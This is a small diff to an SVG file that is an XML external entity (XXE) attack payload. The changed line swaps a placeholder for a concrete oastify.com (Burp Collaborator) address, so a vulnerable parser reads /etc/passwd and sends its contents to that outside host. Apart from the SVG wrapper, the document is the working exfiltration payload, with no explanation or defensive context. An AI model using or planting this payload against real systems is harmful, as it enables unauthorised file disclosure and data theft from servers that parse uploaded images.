@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://burpcollaboratorPayload/?p=%file;'>">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://5qwm4u909gznoygggmf3lmga91fs3wrl.oastify.com/?p=%file;'>">
   %eval;
   %exfil;
 ]>
